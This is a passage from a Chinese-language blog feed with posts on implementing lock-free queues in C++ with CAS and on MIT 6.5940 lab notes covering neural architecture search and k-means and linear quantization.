class="hljs-built_in">cas</span>(&amp;queue.<span class="hljs-built_in">front</span>(), <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() == r || !r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="整体思路梳理（单读单写）"><a href="#整体思路梳理（单读单写）" class="headerlink" title="整体思路梳理（单读单写）"></a>整体思路梳理（单读单写）</h1><p>现在有一个队列，一个生产者和一个消费者</p><p>传统的思路就是用一把大锁，谁要用队列就直接锁上，这样一定会保证线程安全，但是这样太慢了</p><p>先尝试这样的优化思路</p><ol><li>生产者维护一个下标w，指向它生产到了哪里</li><li>消费者维护一个下标r，指向它可以一直读到哪个下标为止</li></ol><p>比如有个队列长为10，如果w&#x3D;5，r&#x3D;3</p><p>r&#x3D;3则表示消费者可以一直读到下标3处为止，比如1,2,3它都可以读</p><p>w&#x3D;5则表示，现在1,2,3,4,5都有东西可读</p><p>之所以w和r不一样，是因为w和r是分别存在于生产者和消费者线程内的，互相不可见，这样就不会有竞争条件</p><p>但是这样虽然没竞争，但是w和r肯定是要同步的，要不然消费者咋知道生产者生产了多少东西</p><p>既然要进行线程间的同步，那肯定要用到锁了。无锁队列采用的是CAS机制。首先全局有一个生产者和消费者都可以操作的变量c</p><ol><li>在生产者生产了一个东西放入队列后，它可以通过变量c的CAS机制将新的下标更新到c中。因为CAS机制，所以一定是线程安全的</li><li>在消费者发现自己已经读到了下标r后，它会试着用变量c的CAS机制来更新下标r，如果有更新，说明有新的可读，否则的话说明没东西读了</li></ol><p>因此，通过变量c，就可以将w和r联系起来，并且一定保证线程安全</p><p>但是还可以继续优化，如果频繁调用CAS机制，那可能还是比较耗费资源</p><ol><li>在生产者端，写入数据后，可以不急着更新到c中，等到写入一定量的数据后，再更新到c中，这样可以避免频繁调用CAS，并且这样一次就可以更新多个值，消费者那边效率也高些，不会说取一个就没了</li><li>在消费者端，其实已经是优化过的思路了，即r指针代表的是可以读到的位置，假如r等于5，而我们目前只读到2，那可以啥也不管地一直读3个，直到读到了r，这时候才需要考虑更新r</li></ol><p>在具体的实现中，还有一个f指针，主要是用于代码实现的，理解思路跟它没啥关系</p><p>至此，又优化了一波。还可以继续优化吗？</p><p>接下来可以从底层数据结构的角度进行优化</p><ol><li>首先，为了避免频繁调用malloc（除了系统调用的开销，它还会阻塞一个进程内的所有线程），可以一次分配一个N个元素的大块。并且可以缓存一个空闲的块，不马上销毁，也可以提升性能</li><li>其次，考虑到一个块太大了浪费，太小了不够用，可以以链表的形式将多个块串起来，这样就可以避免数组带来的连续空间的问题了</li></ol><h1 id="无锁队列的实现（多读多写）"><a href="#无锁队列的实现（多读多写）" class="headerlink" title="无锁队列的实现（多读多写）"></a>无锁队列的实现（多读多写）</h1><p>之前分析的单写单读无锁队列由于没有对w和r加锁，因此只能用于一个生产者一个消费者的情况。</p><h2 id="ArrayLockFreeQueue"><a href="#ArrayLockFreeQueue" class="headerlink" title="ArrayLockFreeQueue"></a>ArrayLockFreeQueue</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE = ARRAY_LOCK_FREE_Q_DEFAULT_SIZE&gt;<br><span class="hljs-keyword">class</span> ArrayLockFreeQueue &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayLockFreeQueue</span>();<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">ArrayLockFreeQueue</span>();<br>    <span class="hljs-function">QUEUE_INT <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 入队</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-type">const</span> ELEM_T &amp;a_data)</span></span>;<br>    <span class="hljs-comment">// 出队</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dequeue</span><span class="hljs-params">(ELEM_T &amp;a_data)</span></span>;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 环形数组</span><br>    ELEM_T m_thequeue[Q_SIZE];<br>    <span class="hljs-comment">// 队列内待处理的元素数量</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_count;<br>    <span class="hljs-comment">// 写坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_writeIndex;<br>    <span class="hljs-comment">// 读坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_readIndex;<br>    <span class="hljs-comment">// 最大的可读位置的坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_maximumReadIndex;<br>    <span class="hljs-comment">// 取余函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> QUEUE_INT <span class="hljs-title">countToIndex</span><span class="hljs-params">(QUEUE_INT a_count)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>需要注意的是，m_maximumReadIndex不一定和m_writeIndex同步，因为申请空间后就会更新writeindex，但只有在数据写入之后，才会更新m_maximumReadIndex</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="取余函数"><a href="#取余函数" class="headerlink" title="取余函数"></a>取余函数</h3><p>循环队列，因此肯定要有取余的操作，直接mod数组的长度Q_SIZE即可</p><p>队列已满的判断条件：(write+1)%size&#x3D;&#x3D;read%size</p><p>队列为空的判断条件：write%size&#x3D;&#x3D;read%size</p><h3 id="入队函数enqueue"><a href="#入队函数enqueue" class="headerlink" title="入队函数enqueue"></a>入队函数enqueue</h3><ol><li>首先判断队列是否已经满了（获取全局的读和写指针），如果已经满了，直接返回false</li><li>如果队列有空位，尝试将写指针+1，如果失败，则回到第1步重新循环</li><li>如果写指针增加成功，那么将值写入更新前的位置（写指针指向的是空闲位置，更新之后，相当于指向的是下一次写的空闲位置）</li><li>最后尝试更新read最多可读到的位置，如果更新失败，则阻塞后再循环（这里有个很奇妙的地方，只有在read最多可读的位置的指针和当前指针相同时，才会将它更新到+1，这样就保证了这个值一定是一点一点地加1，不会出现多个线程乱操作的情况）</li></ol><p>总结来说，CAS很奇妙，使用它不仅是保证这次一定只有一个线程能访问到它正确的值，更是通过它和之前的值进行比较，保证了一定只有某个线程可以更新它</p><p>所以，使用CAS之前，应该拿到一个旧值，这样相当于一个通行证，只有它才能使用CAS更新某个变量为新值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE&gt;<br><span class="hljs-type">bool</span> ArrayLockFreeQueue&lt;ELEM_T, Q_SIZE&gt;::<span class="hljs-built_in">enqueue</span>(<span class="hljs-type">const</span> ELEM_T &amp;a_data) &#123;<br>    QUEUE_INT currentWriteIndex;<br>    QUEUE_INT currentReadIndex;<br>    <span class="hljs-keyword">do</span> &#123;<br>        currentWriteIndex = m_writeIndex;<br>        currentReadIndex = m_readIndex;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">countToIndex</span>(currentWriteIndex + <span class="hljs-number">1</span>) ==<br>            <span class="hljs-built_in">countToIndex</span>(currentReadIndex)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">CAS</span>(&amp;m_writeIndex, currentWriteIndex, (currentWriteIndex + <span class="hljs-number">1</span>)));<br>    m_thequeue[<span class="hljs-built_in">countToIndex</span>(currentWriteIndex)] = a_data;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">CAS</span>(&amp;m_maximumReadIndex, currentWriteIndex, (currentWriteIndex + <span class="hljs-number">1</span>))) &#123;<br>        <span class="hljs-built_in">sched_yield</span>();<br>    &#125;<br>    <span class="hljs-built_in">AtomicAdd</span>(&amp;m_count, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="出队函数dequeue"><a href="#出队函数dequeue" class="headerlink" title="出队函数dequeue"></a>出队函数dequeue</h3><ol><li>先判断当前队列是否为空，如果空的话，直接返回false了。这里可能不太严谨，因为可能刚取完read和max的值，这两个值就被更新了，但是没关系，大不了再调用一次</li><li>取出队头的值，但是这不代表它正确取出了，原因如上所说，可能刚取完read和max的下标，这个下标就已经被别人修改了</li><li>如果现在全局的read指针和自己的指针相同，这才说明这个值应该是由自己取出来，否则的话说明已经被别人给取了</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE&gt;<br><span class="hljs-type">bool</span> ArrayLockFreeQueue&lt;ELEM_T, Q_SIZE&gt;::<span class="hljs-built_in">dequeue</span>(ELEM_T &amp;a_data) &#123;<br>    QUEUE_INT currentMaximumReadIndex;<br>    QUEUE_INT currentReadIndex;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        currentReadIndex = m_readIndex;<br>        currentMaximumReadIndex = m_maximumReadIndex;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">countToIndex</span>(currentReadIndex) ==<br>            <span class="hljs-built_in">countToIndex</span>(currentMaximumReadIndex))    <br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        a_data = m_thequeue[<span class="hljs-built_in">countToIndex</span>(currentReadIndex)]; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">CAS</span>(&amp;m_readIndex, currentReadIndex, (currentReadIndex + <span class="hljs-number">1</span>))) &#123;<br>            <span class="hljs-built_in">AtomicSub</span>(&amp;m_count, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多读多写的机制总结"><a href="#多读多写的机制总结" class="headerlink" title="多读多写的机制总结"></a>多读多写的机制总结</h3><p>多读多写可以说就是在读层面和写层使用了同一个思想</p><ol><li>先建立一个所有线程共享的下标值</li><li>在每个线程试图去操作的时候，先取出当前的下标值，然后判断队空或者队满</li><li>如果自己可以操作的话，通过CAS判断目前这个点是否轮到自己操作了，即没有被其他线程抢先操作完了<ol><li>对于写线程来说，检查write的下标是否和自己记录的一样，一样的话，说明可以操作，否则循环重新去取下一个吧，这个已经被别人处理了</li><li>对于读线程来说也是这样，检查现在read的下标是否和自己记录的一样</li><li>当然了，对于写线程来说，它还需要多一个更新可读的最大下标的任务，同样是判断是否应该是自己操作。具体实现上通过之前记录的write下标即可</li></ol></li></ol><p>这里有个小坑，就是因为是循环数组，因此如果存的是智能指针，可能不会自动释放</p><h2 id="yield的重要性"><a href="#yield的重要性" class="headerlink" title="yield的重要性"></a>yield的重要性</h2><p>明明说是无锁队列，为什么还要用yield放弃cpu主动阻塞呢？</p><p>因为如果不主动让出cpu，当前线程可能会因为CAS操作失败而不断循环，即空转cpu，这种情况下，还不如让出cpu。</p><p>如果只有一个生产者，那么当然不需要yield，也不可能运行到yield语句，但是如果有很多个生产者，就需要考虑了。</p><h1 id="总结-致谢"><a href="#总结-致谢" class="headerlink" title="总结&amp;致谢"></a>总结&amp;致谢</h1><p>无锁队列不是真的无锁，而是将锁的粒度设置地特别小，使得并发的性能尽量高。但是好像它只是在并发量特别高的时候才有很好的性能，普通情况下可能还不如直接用锁来的方便，所以还是要依据具体情况选择。</p><p>在科软的第一个学期已经要结束了，这学期的课基本也都上完了。只能说孟宁老师的《网络程序设计》真绝世好课，原因如下</p><ol><li>可以学到东西：几次实验包括了的epoll，grpc框架和消息队列，以及linux内核协议栈的调试（gcc调试方法）</li><li>课程内容也不会脱离找工作找实习：第1点里提到的基本都是C++面试必问的。有些课程虽然也能学到东西，但是对于找实习找工作，性价比太低</li><li>平时作业很轻松：以学到东西为主，没有很严格的考核机制</li><li>最后的大作业的自由度很高，可以借此机会选择自己感兴趣的方向深入学习一下</li></ol><p>最后，借此机会还搭建了个人博客，只能说，绝世好课！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>6.5940_lab3</title>
    <link href="/2023/12/07/6-5940-lab3/"/>
    <url>/2023/12/07/6-5940-lab3/</url>
    
    <content type="html"><![CDATA[<h2 id="Part-1-Predictors-3-Questions-30-pts"><a href="#Part-1-Predictors-3-Questions-30-pts" class="headerlink" title="Part 1. Predictors (3 Questions, 30 pts)"></a>Part 1. Predictors (3 Questions, 30 pts)</h2><p>首先在之前，就获得了一个<code>ofa_network</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ofa_network = OFAMCUNets(<br>    n_classes=<span class="hljs-number">2</span>,<br>    bn_param=(<span class="hljs-number">0.1</span>, <span class="hljs-number">1e-3</span>),<br>    ....,<br>)<br>ofa_network.load_state_dict()<br></code></pre></td></tr></table></figure><p>在下面这个函数中展示了它的用法，说明ofa_network是一整个超网，cfg是config的缩写，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_sub_network</span>(<span class="hljs-params"></span><br><span class="hljs-params">    ofa_network, cfg, image_size=<span class="hljs-literal">None</span></span>)<br></code></pre></td></tr></table></figure><p>通过下面两个函数可以根据cfg获取子网，然后就可以衡量并测试子网的性能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ofa_network.set_active_subnet(**cfg)<br>subnet = ofa_network.get_active_subnet().to(device)<br></code></pre></td></tr></table></figure><p>其中cfg可以通过下面这个函数得到，第一个函数可以传入随机的，也可以传入max或者min</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cfg = ofa_network.sample_active_subnet(<br>    sample_function=random.choice, <br>    image_size=image_size)<br></code></pre></td></tr></table></figure><h3 id="Question-2-10-pts-Implement-the-efficiency-predictor"><a href="#Question-2-10-pts-Implement-the-efficiency-predictor" class="headerlink" title="Question 2 (10 pts): Implement the efficiency predictor"></a>Question 2 (10 pts): Implement the efficiency predictor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data_shape = (<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, spec[<span class="hljs-string">&quot;image_size&quot;</span>], spec[<span class="hljs-string">&quot;image_size&quot;</span>])<br>macs = count_net_flops(subnet, data_shape=data_shape)<br>peak_memory = count_peak_activation_size(<br>    subnet, data_shape=data_shape)<br></code></pre></td></tr></table></figure><h3 id="Question-3-10-pts-Implement-the-accuracy-predictor"><a href="#Question-3-10-pts-Implement-the-accuracy-predictor" class="headerlink" title="Question 3 (10 pts): Implement the accuracy predictor"></a>Question 3 (10 pts): Implement the accuracy predictor</h3><p>下面这个类可以将一个model变成vector，比如这个model的某个卷积核的大小可以为[4,5,6]，那么[0,1,0]代表选择卷积核为5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">arch_encoder = MCUNetArchEncoder()<br></code></pre></td></tr></table></figure><p>准确率预测器是根据网络的结构预测准确率，在这里，它又三个linear组成</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-keyword">self</span>.n_layers):<br>    layers.<span class="hljs-title function_ invoke__">append</span>(<br>        nn.<span class="hljs-title function_ invoke__">ReLU</span>(<br>            nn.<span class="hljs-title function_ invoke__">Linear</span>(<br>                <span class="hljs-keyword">self</span>.hidden_size <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">self</span>.arch_encoder.n_dim,<br>                <span class="hljs-keyword">self</span>.hidden_size,bias=False<br>            )<br>        )<br>    )<br></code></pre></td></tr></table></figure><h3 id="Question-4-10-pts-Complete-the-code-for-accuracy-predictor-training"><a href="#Question-4-10-pts-Complete-the-code-for-accuracy-predictor-training" class="headerlink" title="Question 4 (10 pts): Complete the code for accuracy predictor training."></a>Question 4 (10 pts): Complete the code for accuracy predictor training.</h3><p>得到了准确率预测器之后，还需要根据要应用的数据来调整一下，这里就是常规的pytorch训练的流程.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">pred = acc_predictor(data)<br>loss = criterion(pred,label)<br>optimizer.zero_grad()<br>loss.backward()<br>optimizer.step()<br></code></pre></td></tr></table></figure><h2 id="Part-2-Neural-Architecture-Search-6-Questions-65-pts-10-bonus-pts"><a href="#Part-2-Neural-Architecture-Search-6-Questions-65-pts-10-bonus-pts" class="headerlink" title="Part 2. Neural Architecture Search (6 Questions, 65 pts + 10 bonus pts)"></a>Part 2. Neural Architecture Search (6 Questions, 65 pts + 10 bonus pts)</h2><h3 id="Question-5-5-pts-Complete-the-following-random-search-agent"><a href="#Question-5-5-pts-Complete-the-following-random-search-agent" class="headerlink" title="Question 5 (5 pts): Complete the following random search agent"></a>Question 5 (5 pts): Complete the following random search agent</h3><p><strong>RandomSearcher</strong>类</p><ol><li><code>__init__</code>传入准确率预测器和效率预测器</li><li><code>random_valid_sample</code>传入限制，随机得到一个模型，如果能够满足精度，则返回模型</li><li><code>run_search</code>传入限制和数量n，得到n个满足进度和效率的模型，选取最好的那个</li></ol><p>只需要补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">best_idx = torch.argmax(accs)<br></code></pre></td></tr></table></figure><h3 id="Question-6-5-pts-Complete-the-following-function"><a href="#Question-6-5-pts-Complete-the-following-function" class="headerlink" title="Question 6 (5 pts): Complete the following function"></a>Question 6 (5 pts): Complete the following function</h3><p><strong>search_and_measure_acc</strong>函数</p><ol><li>传入随机查找的类，限制，以及其他参数</li><li>根据以上参数得到一个随机得到的可以满足进度和效率限制的<strong>配置</strong></li><li>根据这个配置从超网中取出对应的网络，验证是否正确</li></ol><p>具体的使用如下，通过<code>search_constraint = dict(millonMACs=millonMACs)</code>表明了设置限制，这里设置了macs</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust">nas_agent = <span class="hljs-title function_ invoke__">RandomSearcher</span>(<br>    efficiency_predictor, acc_predictor)<br>subnets_rs_macs = &#123;&#125;<br><span class="hljs-keyword">for</span> <span class="hljs-variable">millonMACs</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">50</span>, <span class="hljs-number">100</span>]:<br>    search_constraint = <span class="hljs-title function_ invoke__">dict</span>(millonMACs=millonMACs)<br>    <span class="hljs-title function_ invoke__">print</span>(f<span class="hljs-string">&quot;Random search with constraint: MACs &lt;= &#123;millonMACs&#125;M&quot;</span>)<br>    subnets_rs_macs[millonMACs] = <span class="hljs-title function_ invoke__">search_and_measure_acc</span>(<br>        nas_agent, search_constraint, n_subnets=<span class="hljs-number">300</span>)<br></code></pre></td></tr></table></figure><p>至此可以理一下随机搜索的思路</p><ol><li>首先可以有准确率和效率预测器，根据这两个先得到一个可能的满足要求的配置</li><li>根据这个配置从超网中取真正的网络，并验证</li></ol><h3 id="Question7-20-pts-Complete-the-following-evolutionary-search-agent"><a href="#Question7-20-pts-Complete-the-following-evolutionary-search-agent" class="headerlink" title="Question7 (20 pts): Complete the following evolutionary search agent"></a>Question7 (20 pts): Complete the following evolutionary search agent</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">new_sample[key] = random.choice([sample1[key], sample2[key]])<br>new_sample[key][i] = random.choice(<br>    [sample1[key][i], sample2[key][i]])<br>population = <span class="hljs-built_in">sorted</span>(population, <br>    key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>], reverse=<span class="hljs-literal">True</span>)<br>population = population[:parents_size]<br><br></code></pre></td></tr></table></figure><p>后面两个question属于炼丹调参的范畴，但还是有一些思路可以遵循</p><ol><li><code>resolution_mutate_prob</code>很重要，应该是因为增加了管道，提取的信息更加丰富</li><li><code>population_size</code>越大越好，因为这个代表了种群的基本盘，越多的话越可能出好的模型</li><li><code>parent_ratio</code>越大也越好，依然是因为变异的群体变多了</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个lab其实做的有点莫名其妙的，因为就是调用了已经写好了的<code>mcunet</code>，后面缕了一下思路</p><ol><li>发现所谓的搜索空间，就是先定好了一些超参数，比如卷积的通道数，卷积核的大小等等，然后提供了一些可选的值，通过这些参数的排列组合，有非常多种情况</li><li>我们需要的是能满足精读和效率要求的组合，其中效率要求主要是macs和peak memory，也对应了衡量计算和存储两大部分（这两个不能完全代表latency，但有参考价值）</li><li>为了更快地衡量进度，而不用重新推理一遍，建立了一个数据集，根据arch为键，acc为值。其中arch就是用vector的形式量化了model，具体来说，对于每个参数，可能有[a,b,c]三种取指，可以通过[0,1,0]表示取b</li><li>最后有两种搜索的策略<ol><li>随机搜索</li><li>仿生物进化的搜索<ol><li>变异</li><li>融合</li></ol></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>模型压缩/加速</category>
      
      <category>MIT6.5940</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型压缩/加速</tag>
      
      <tag>MIT6.5940</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.5940_lab2</title>
    <link href="/2023/12/03/6-5940-lab2/"/>
    <url>/2023/12/03/6-5940-lab2/</url>
    
    <content type="html"><![CDATA[<h1 id="K-Means-Quantization"><a href="#K-Means-Quantization" class="headerlink" title="K-Means Quantization"></a>K-Means Quantization</h1><h2 id="Question-1-10-pts"><a href="#Question-1-10-pts" class="headerlink" title="Question 1 (10 pts)"></a>Question 1 (10 pts)</h2><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205113041534.png" alt="image-20231205113041534"></p><p>首先初始化了一个kmeans算法的对象，主要是传入了需要多少种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">kmeans = KMeans(n_clusters=n_clusters, mode=<span class="hljs-string">&#x27;euclidean&#x27;</span>, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>然后通过调用这个函数，传入了需要聚拢的数组，它应该就是会选择出n_clusters个值作为量化后的值，然后返回原来的数组中元素在新数组中的下标index</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">labels = kmeans.fit_predict(fp32_tensor.view(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)).to(torch.long)<br></code></pre></td></tr></table></figure><p>然后可以得到新的数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">centroids = kmeans.centroids.to(torch.<span class="hljs-built_in">float</span>).view(-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>最后写一行代码就可以通过量化后的结果恢复到原来的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">quantized_tensor = codebook.centroids[codebook.labels].view_as(fp32_tensor)<br></code></pre></td></tr></table></figure><h2 id="Question-2-10-pts"><a href="#Question-2-10-pts" class="headerlink" title="Question 2 (10 pts)"></a>Question 2 (10 pts)</h2><p>简答题</p><h2 id="K-Means-Quantization-on-Whole-Model"><a href="#K-Means-Quantization-on-Whole-Model" class="headerlink" title="K-Means Quantization on Whole Model"></a>K-Means Quantization on Whole Model</h2><h3 id="KMeansQuantizer类"><a href="#KMeansQuantizer类" class="headerlink" title="KMeansQuantizer类"></a>KMeansQuantizer类</h3><ol><li><code>__init__</code>输入一个model和bitwidth，调用了<code>quantize</code>得到这个模型的量化结果的字典，键为参数的名称，值为参数的codebook，即数据+index</li><li><code>quantize</code>遍历了所有参数（矩阵，tensor），对它们进行量化，并返回结果的字典（输入的bitwidth可以是数字也可以是列表，即统一bitwidth还是每一层不同）</li><li><code>apply</code>用于更新codebook或者得到量化后用于计算的结果</li></ol><h2 id="Question-3-10-pts"><a href="#Question-3-10-pts" class="headerlink" title="Question 3 (10 pts)"></a>Question 3 (10 pts)</h2><p>完成QAT，即在k-means方法之上，对量化后的codebook进行反向传播。具体实现上，只需要将相关的参数求平均值即可。具体的实现上使用了python的语法糖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">codebook.centroids[k] = torch.mean(fp32_tensor[<br>    torch.where(codebook.labels==k)])<br></code></pre></td></tr></table></figure><h2 id="训练模型的整体代码"><a href="#训练模型的整体代码" class="headerlink" title="训练模型的整体代码"></a>训练模型的整体代码</h2><p>本质上和剪枝一样，每训练完一个batch，就会更新参数，在这里就是更新量化后的结果，通过给train传入一个callback函数实现</p><p>总的来说</p><ol><li>首先得到每一层的codebook</li><li>在训练之前<ol><li>对模型进行量化，将原来的参数都变成量化后的结果</li><li>虽然看起来量化之后还是那么多数量的float32，但其实因为Python的语法特性，这都是对某个tensor的引用，不额外占空间</li></ol></li><li>训练之后<ol><li>根据反向传播优化之后的参数，更新codebook</li></ol></li></ol><h1 id="Linear-Quantization"><a href="#Linear-Quantization" class="headerlink" title="Linear Quantization"></a>Linear Quantization</h1><h2 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h2><p><strong>linear_quantize</strong>函数给出了要量化的矩阵，以及S和Z，因此只需要按照公式计算就行了</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205141558344.png" alt="image-20231205141558344"></p><h2 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h2><p>对于S可以使用如下公式计算，还可以用KL散度</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205142203375.png" alt="image-20231205142203375"></p><p>Z可以用这个公式计算</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205142104670.png" alt="image-20231205142104670"></p><p>包装了一个函数，输入一个参数矩阵以及量化的bit，返回量化后的结果以及S和Z</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">linear_quantize_feature</span>(<span class="hljs-params"></span><br><span class="hljs-params">    fp_tensor, 